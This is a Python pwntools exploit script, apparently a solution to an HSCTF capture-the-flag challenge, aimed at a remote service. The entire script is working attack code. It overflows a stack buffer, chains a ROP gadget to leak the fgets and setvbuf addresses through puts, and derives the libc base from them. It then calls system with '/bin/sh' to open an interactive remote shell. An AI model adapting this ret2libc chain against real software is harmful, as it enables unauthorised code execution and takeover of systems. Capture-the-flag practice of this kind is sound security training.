from pwn import * 

exe = ELF("./ex")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

#p = process("./ex")
#gdb.attach(p)
p = remote("ex.hsctf.com", 1337)

context.binary = exe

main = 0x401276
ret = 0x40101a
pop_rdi_ret = 0x4014f3
fgets_got = exe.got["fgets"]
setvbuf_got = exe.got["setvbuf"]
puts_plt = exe.plt["puts"]

payload = b"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ" 
payload += p64(pop_rdi_ret)
payload += p64(fgets_got)
payload += p64(puts_plt)
payload += p64(ret) 
payload += p64(main)
p.sendline(payload)
p.recvline()
p.sendline(b"Q")

recieved1 = p.recvline().strip()
leaked_fgets = u64(recieved1.ljust(8, b"\x00"))
log.success("Leaked libc address, fgets: "+ str(hex(leaked_fgets)))

second_payload = b"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ" 
second_payload += p64(pop_rdi_ret)
second_payload += p64(setvbuf_got)
second_payload += p64(puts_plt)
second_payload += p64(ret) 
second_payload += p64(main)
p.sendline(second_payload)
p.recvline()
p.sendline(b"Q")

recieved2 = p.recvline().strip()
leaked_setvbuf = u64(recieved2.ljust(8, b"\x00"))
log.success("Leaked libc address, setvbuf: "+ str(hex(leaked_setvbuf)))

libc.address = leaked_setvbuf - libc.symbols["setvbuf"] # save libc base

libc_system = libc.sym["system"]
binsh = next(libc.search(b"/bin/sh"))
libc_exit = libc.sym["exit"]

log.info("binsh: "+ str(hex(binsh)))
log.info("system: "+ str(hex(libc_system)))
log.info("exit: "+ str(hex(libc_exit)))

last_payload = b"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ" 
last_payload += p64(pop_rdi_ret)
last_payload += p64(binsh)
last_payload += p64(ret)
last_payload += p64(libc_system)
last_payload += p64(libc_exit)
p.sendline(last_payload)
p.recvline()
p.sendline(b"Q")

p.interactive()